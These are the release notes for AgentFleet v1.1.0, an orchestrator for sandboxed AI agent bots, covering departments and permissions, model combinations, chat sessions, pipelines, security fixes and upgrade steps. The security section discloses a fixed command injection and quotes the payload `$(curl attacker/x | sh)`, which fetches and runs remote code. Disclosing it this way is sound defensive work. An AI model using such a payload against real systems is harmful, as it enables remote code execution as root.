# AgentFleet v1.1.0

Eighty-two commits since v1.0.0.

v1.0.0 was built around one operator and one bot at a time. This release is about
several of each: departments with their own people and machines, several models
doing different jobs for the same agent, several conversations with the same bot,
and pipelines that put several bots in a row. It also carries a security fix that
matters and a crash that could take the orchestrator down.

The full list is in [CHANGELOG.md](../CHANGELOG.md). This page covers what is
worth knowing before you upgrade.

---

## Organisations, departments and per-bot permissions

Access in v1.0.0 was three global roles. Every operator could see, drive and
delete every bot in the fleet and read every shared credential. That is workable
for one person and wrong for an organisation, where the questions are "which
bots" and "how much".

There are now two levels, and they answer different questions.

An **organisation** — a department — has members, each with an org role. That
answers "what does someone at this level normally do", and an administrator sets
it once. Viewer stops at read, because someone brought in to check what the fleet
did should not be able to make it do more. Member gets the desktop, since driving
a bot is the normal way to work with one, but not edit or delete, which change or
destroy other people's work.

A **per-bot grant** answers "except for this one": the contractor who may drive a
single machine, the auditor who may read one bot's transcripts and nothing else.
A grant wins outright, including when it is empty — that is how a single bot is
hidden from someone who can otherwise see their whole department.

Two details worth knowing because they are load-bearing:

- **Watching a desktop and driving it are separate permissions**, and the
  difference is enforced by which VNC server the connection is spliced to. A
  read-only flag in the client would not survive an edited URL.
- **Listings are filtered, not gated.** Someone who may see two bots of twenty
  receives two. Returning all twenty and hiding eighteen in the client would put
  every department's bot names on the wire.

`GET /api/me/permissions` returns the caller's effective permissions, so clients
do not each re-derive them and disagree about what to show.

The permission work took three passes. The last three ungated routes were found
by enumerating the router rather than reading it, which is the only method that
terminates.

## Model combinations

The philosophy document had long described splitting perception from reasoning.
An audit found that nothing implemented it: every call site used the same chain,
so one model read the screen, planned, chatted and summarised.

Roles are now real — `vision`, `reasoning`, `chat`, `summarize`, `refine` — and
each call site asks for the role it is actually playing. A **combination** is a
named mapping from roles to models. The simple form is a brain and a pair of
hands, which is the split that matters most: reading a screen and reasoning about
it reward completely different models. The advanced form exposes every role, for
when summarising a long thread should not cost what planning does.

Combinations sit in the same fallback chain as single providers. That is the
point of the design: it makes "this pair, and if neither answers, that one"
expressible as one ordered list, rather than two parallel mechanisms.

Vision deliberately never falls back to a role chosen for text. A combination
that assigns a text-only model to the hands is refused when you save it, with the
reason — the alternative is an agent that appears to do nothing, because a
vision-blind provider is dropped every turn a screenshot is present.

`GET /api/instances/{id}/models/resolved` answers "which model is this bot
actually using for this job", after expansion and fallback. Reach for it when a
bot is not behaving like the model you thought you gave it.

## Custom tools

An archetype's tool list used to be all-or-nothing and fixed. You can now
provision with a subset of it and add tools it has never heard of — a company's
internal CLI is never going to be in a built-in catalogue, and editing a file
inside the sandbox image is not a workflow.

A custom tool carries how to fetch it: apt, pip, npm, `go install`, a downloaded
binary, or a repository cloned into the workspace. Operator recipes are written
in the same format as the built-in file and consulted first, so an addition
behaves exactly like a built-in one and can override it.

Names and specifications are validated against an allowlist before anything is
provisioned, because these values reach a shell inside the sandbox — and the
injection described below came from assuming a tool name was well behaved.
Refusing at the door beats sanitising deep in a script. The `sh` recipe method
remains available to the image's own file and is deliberately not one of the
methods a request can ask for.

Separately, archetypes now install what their templates promise and claim only
what landed. The templates declare tools aspirationally; the orchestrator
reconciles the agent's prompt against what actually installed, so a model is not
told it has Ghidra when it does not.

## Per-bot chat sessions

A bot had one unbounded history. There was no way to start a fresh chat, or clear
one that had gone somewhere unhelpful, without losing every conversation you had
ever had with that agent.

Chats are now sessions you can start, name, pin and delete, with a switcher above
the conversation rather than buried in a menu — which chat you are in changes
what the agent can see, so it belongs on screen.

Each chat is its own context. The history replayed into the model is scoped to
the open chat, which is the whole point: an unscoped read would feed every
earlier conversation back into a chat you deliberately started clean.

Messages recorded before the migration keep a null session and appear as "Earlier
chat", so no history is stranded. It is listed only when it actually holds
something.

## Sender identity

Every human turn used to arrive as `role='user'` with no attribution. An agent
could not tell one colleague from another, address anyone by name, or notice that
whoever is asking now is not who set the task. With departments and several
operators, that is the difference between a colleague and an anonymous prompt.

Chat and peer messages now carry the person who sent them. The name is prefixed
onto replayed history, because the chat APIs underneath have no per-message
author and a conversation where three colleagues appear as one voice reads as one
person contradicting themselves. The display name is the local part of the
address: an agent should say "alex", not read out an email.

Memories can now be about a person. An agent marks a note as being about whoever
asked — a stated preference, what they are responsible for — and it is attributed
to them rather than to the world. Those notes come back when that person next
talks to that bot, and to nobody else: what one agent learned about a colleague is
not every agent's to know. The prompt says explicitly not to recite them, because
a model handed a list of facts about someone will otherwise open with it, and not
to guess at people — only to record what it was told or plainly shown.

## Pipelines that actually run

Running a real three-bot pipeline turned up four faults, each of which made the
feature look like it worked.

Execution walked the node list in declaration order and ignored the edges, so
what was stored as a graph ran as a list — a node could complete before the node
it depended on had started. Worse, nothing ran at all: each node slept 500 ms and
recorded "Completed goal by X: verified deliverable created", then the run
reported completed. It could not fail. Nothing was validated, so a pipeline with
unnamed nodes, no goals, edges pointing at nodes that do not exist, or a
dependency cycle was accepted with a 200. And a run did not survive a restart.

Nodes are now topologically ordered. With no edges the order is the declared one,
so pipelines written before edges existed are unaffected. A node is dispatched
through the same trigger dispatcher that webhooks and cron use, the run waits for
the real task and records what it produced, and a failing node fails the pipeline
rather than handing the next node a dependency that never produced anything.
Invalid graphs are refused at save with the reason, because a pipeline is written
once and run on a schedule: it should fail in front of whoever is writing it.

**Be clear about what this is not.** The engine runs nodes **one at a time**, and
it does not evaluate edge conditions — `condition` is stored, round-tripped and
displayed, and nothing acts on it. Parallel execution and conditional branching
are both unimplemented. The app's copy previously promised otherwise and has been
corrected.

## Security

### Command injection through `preinstalled_tools`

**Critical.** Provisioning verified a bot's toolchain by writing each tool name
into a bash script with Go's `%q`. `%q` produces a *double*-quoted string, and
bash expands `$(...)` and backticks inside double quotes. A tool name of
`$(curl attacker/x | sh)` in a create-instance request therefore ran as root
inside the sandbox.

Reachable by any operator with permission to create a bot in one organisation —
which, under the RBAC introduced in this same release, can be a fairly ordinary
member. Confirmed by exploit against a running server: the payload created a file
as root in the container.

The value is now single-quoted, which suppresses every expansion bash performs,
with the awkward case — the single quote itself — closed and reopened around an
escape. The tests run the real shell rather than asserting on the quoted string,
because the thing being claimed is what bash does with it, not what the string
looks like.

**A related failure worth its own paragraph.** The first fix appeared not to
work. Upgrading dependencies had raised `go.mod` to Go 1.25 while the Dockerfile
still built on 1.23, so every image build had been failing at `go mod download` —
and Compose carried on running the previous image while the deploy printed
"Started". Four deploys reported success and shipped nothing. The build image is
bumped, and the deployed binary was checked for the fix rather than assumed. If
you run your own images, check that yours is actually rebuilding.

### A fatal concurrent-map crash

A pipeline run carries its node results in a map, and both the trigger and list
paths handed the struct out by value — which shares that map with the goroutine
still executing the pipeline. The API layer then serialised it while a node wrote
to it.

A concurrent map access is a fatal runtime error in Go, not a recoverable panic.
So refreshing the pipelines screen while a pipeline was running could take the
whole orchestrator down, along with every task in flight. Runs now leave the
engine as snapshots. A related unlocked read of the store handle was fixed at the
same time.

### Three dependency vulnerabilities

`govulncheck` went from three vulnerabilities reachable from this code to none.

- **pgx 5.7.1 → 5.9.2**, which carried a SQL injection through placeholder
  confusion with dollar-quoted literals. This is the one to care about: it is the
  database driver, and the whole persistence layer runs through it.
- **golang-jwt** and **golang.org/x/text**, both upgraded alongside.

### Two fixes from the audit pass

Both of these were made during the audit and landed inside commit `7abc2c0`,
whose stated purpose was a comms UI change. Recording them here so they are not
lost to that commit's subject line.

- **The set-role route stored any string as a role.** Creating a user validated
  the role; changing one did not. An unrecognised role ranks below every gate, so
  writing one locked the account out of the entire API — and the request answered
  204, so it read as success. Aiming the same call at a user ID that does not
  exist also answered 204, because an UPDATE matching no rows is not an error to
  the driver. Commit `0edf888` added the tests and the missing-user case.
- **`ExecAs` did not check the Docker exec-start status.** The engine's own error
  body was demultiplexed and returned as though it were the command's stdout,
  with a nil error. A caller probing a paused container was told the probe had run
  and printed something.

### Sudo is now revocable at runtime

`no-new-privileges` is deliberately no longer set on sandbox containers. It is the
stronger control — the kernel ignores every setuid bit, so it does not matter what
the filesystem says — but the kernel applies it at container creation and it
cannot be changed afterwards. Using it to gate sudo meant the only way to revoke
sudo from an agent was to recreate its container, and these sandboxes carry no
volume, so that discards everything the agent has done. The moment you most want
to revoke sudo is mid-incident, which is exactly the moment losing the workspace
costs most.

Sudo is gated by the setuid bit on `/usr/bin/sudo` instead, cleared at provision
unless asked for and changeable at any time. The agent is unprivileged and cannot
restore the bit, since doing so needs the privilege being withheld.

**What this costs:** the kernel-level backstop is gone. A vulnerability in sudo,
or in another setuid binary in the image, is now reachable where the kernel used
to refuse outright. If that is in your threat model, run with sudo off everywhere
and accept that revoking it is not an operation you will need. The full reasoning
is in `securityOpts` in `backend/internal/fleet/tiers.go` and in
[SECURITY.md](SECURITY.md).

---

## Upgrading

- **Database migrations run automatically at boot.** Twenty migrations
  (`0008`–`0027`) arrive with this release, adding twelve tables — `orgs`,
  `org_members`, `bot_grants`, `model_combos`, `model_combo_roles`,
  `chat_sessions`, `conversations`, `conversation_members`, `pipelines`,
  `instance_orgs`, `work_items` and `api_keys` — plus columns on several
  existing ones.

  **One is destructive.** `0025` copies `instances.org_id` into the new
  `instance_orgs` table and then runs `ALTER TABLE instances DROP COLUMN
  IF EXISTS org_id`, because a bot can now belong to several departments and
  two records of the same fact drift apart. The copy happens first and in the
  same migration, so no assignment is lost — but a dropped column does not come
  back. Take a backup first, and mean it this time.
- **Rebuild your images.** The backend Dockerfile moved to Go 1.25 and the
  sandbox image changed. If your deploy has been silently reusing a stale image —
  see the note above — you would not have the security fix.
- **Existing bots keep working.** A model chain that names only providers behaves
  exactly as before; combinations are opt-in. Skills, tasks and chat history are
  preserved, with pre-migration chat messages appearing under "Earlier chat".
- **Existing users keep their platform role.** Organisations and grants are
  additive; a fleet with no organisations behaves as it did.
- **Check `PUBLIC_URL`.** It is new in `.env.example` and is what the OAuth
  redirect URI is built from. If it says `localhost`, a provider sign-in started
  from your phone will fail, because the phone would be redirected to itself.

## Known limitations

Stated here rather than left to be discovered. The README carries the full list.

- The **MCP bridge does not speak MCP.** It registers servers and lists tools,
  but there is no JSON-RPC and no transport, tool calls return a canned response,
  and agents cannot reach it at all. The MCP Hub screen is a placeholder.
- **Swarms do not run anything.** The coordinator is an in-memory store over a
  message list.
- **Pipelines run one node at a time** and ignore edge conditions, as above. There
  is no graph builder; the console's create button posts a fixed three-node
  pipeline.
- **Archetype export/import** writes a JSON manifest and the import command
  prints a summary without importing.
- The agent's **`speak` action does not reach the TTS sidecar**; the HTTP endpoint
  does.
- **Memory is a bag-of-words index**, not embeddings, and is scoped per bot.
- **Cached-token accounting is always zero** — nothing populates the field.
- The **`developer-heavy` tier** asks for an image tag that nothing in this
  repository builds.
